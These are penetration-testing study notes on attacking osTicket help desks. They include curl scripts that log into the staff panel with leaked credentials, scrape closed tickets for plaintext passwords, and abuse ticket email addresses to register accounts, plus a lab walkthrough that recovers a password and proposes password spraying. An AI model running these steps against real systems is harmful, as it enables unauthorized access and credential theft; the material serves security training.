# Section 16 — Attacking osTicket

osTicket is an open-source PHP/MySQL help desk ticketing system. Runs under Apache or IIS. Not typically vulnerable to direct CVEs worth exploiting, but valuable for:
1. **Email harvesting** — creating a ticket assigns a company email address usable for other services
2. **Sensitive data extraction** — staff ticket queues often contain credentials, internal info, password resets

---

## Discovery

### Detection
- Cookie `OSTSESSID` set on page visit → osTicket
- Footer text: "powered by osTicket" or "Support Ticket System"
- Staff panel at `/scp/login.php`

### Fingerprinting
```bash
curl -s http://TARGET/scp/login.php | grep -i "osticket\|version"
```

No CVEs worth automating for modern versions. Focus on credential reuse and data exposure.

---

## Attack Vector 1 — Email Harvesting → Account Registration

1. Open a new ticket at `http://TARGET/open.php`
2. Check the confirmation for an assigned internal email (e.g., `940288@company.local`)
3. Log in and view the ticket — any replies to that address appear in the thread
4. Use that email to register accounts on exposed services (GitLab, Slack, Mattermost, internal portals) requiring company email verification
5. The signup confirmation emails arrive in the osTicket thread

**Useful when:** External Slack/GitLab/wiki found that requires company email verification.

---

## Attack Vector 2 — Credential Reuse → Staff Panel Access

1. Gather leaked credentials (Dehashed, breach data, OSINT)
2. Try credentials at `/scp/login.php` — login accepts both username AND email address
3. Once in as a staff agent, review closed tickets for:
   - Passwords sent in plain text
   - Internal usernames and systems
   - Standard new-joiner passwords mentioned by support
   - Address book (user directory) for additional accounts

**Key insight:** Support agents frequently make mistakes like emailing passwords directly in ticket replies. Closed tickets especially.

### Login (with CSRF token)
```bash
TOKEN=$(curl -s -c /tmp/ost.txt "http://TARGET/scp/login.php" \
  | grep -oP '__CSRFToken__" value="\K[^"]+')

curl -s -c /tmp/ost.txt -b /tmp/ost.txt \
  -X POST "http://TARGET/scp/login.php" \
  -d "__CSRFToken__=$TOKEN&do=scplogin&userid=user%40company.local&passwd=Password1%21&login=" \
  -L -o /dev/null -w "%{http_code}"
# 200 = success (check for "Welcome, <name>" in response)
```

### Browse closed tickets
```bash
# Search for specific user
curl -s -b /tmp/ost.txt "http://TARGET/scp/tickets.php?a=search&query=charles" \
  | grep -oP 'tickets\.php\?id=\K\d+'

# Read specific ticket
curl -s -b /tmp/ost.txt "http://TARGET/scp/tickets.php?id=7" \
  | python3 -c "
import sys, re
html = sys.stdin.read()
for m in re.finditer('posted \d+/\d+/\d+[^<]+', html):
    pos = m.start()
    snippet = html[pos:pos+500]
    text = re.sub(r'<[^>]+>', ' ', snippet)
    print(re.sub(r'\s+', ' ', text)[:300])
    print('---')
"
```

---

## Exam Notes

- osTicket staff URL: `/scp/login.php` — accepts username OR email
- Ticket search: `/scp/tickets.php?a=search&query=NAME`
- Direct ticket view: `/scp/tickets.php?id=N`
- CSRF token required for login POST: field name `__CSRFToken__`
- Closed ticket queue often has sensitive data — support agents paste passwords in replies
- Address book (Users tab) = internal email list for password spraying targets
- CVE-2020-24881: SSRF in osTicket 1.14.1 — rarely seen in wild but worth checking version

---

## Lab Walkthrough (`support.inlanefreight.local` → `10.129.99.86`)

**vHost:** Add `10.129.99.86 support.inlanefreight.local` to `/etc/hosts`

**Credentials found via OSINT (Dehashed):**
- `jclayton:JulieC8765!` — doesn't work
- `kgrimes:Fish1ng_s3ason!` — doesn't work by username
- `kevin@inlanefreight.local:Fish1ng_s3ason!` — **works** (email login)

```bash
TOKEN=$(curl -s -c /tmp/ost.txt -H "Host: support.inlanefreight.local" \
  "http://10.129.99.86/scp/login.php" | grep -oP '__CSRFToken__" value="\K[^"]+')

curl -s -c /tmp/ost.txt -b /tmp/ost.txt \
  -H "Host: support.inlanefreight.local" \
  -X POST "http://10.129.99.86/scp/login.php" \
  -d "__CSRFToken__=$TOKEN&do=scplogin&userid=kevin%40inlanefreight.local&passwd=Fish1ng_s3ason%21&login=" \
  -L -o /dev/null

# Search for Charles Smithson
curl -s -b /tmp/ost.txt -H "Host: support.inlanefreight.local" \
  "http://10.129.99.86/scp/tickets.php?a=search&query=charles" | grep -oP 'id=\K\d+'
# → ticket ID 7

# Read ticket - Kevin's accidental password reveal
curl -s -b /tmp/ost.txt -H "Host: support.inlanefreight.local" \
  "http://10.129.99.86/scp/tickets.php?id=7" > /tmp/t7.html

grep -oP "No worries.*?Regards" /tmp/t7.html
# "No worries! Use Inlane_welcome! Regards"
```

**Answer:** `Inlane_welcome!`

**What happened:** Charles was locked out of VPN. Kevin reset to standard onboarding password. Charles didn't have the paperwork. Kevin responded in the ticket thread with the actual password instead of calling — classic support mistake.

**Next move in a real engagement:** Use `Inlane_welcome!` against `vpn.inlanefreight.local` and other services, and password-spray it against other company accounts (it's described as the "standard new-joiner password").
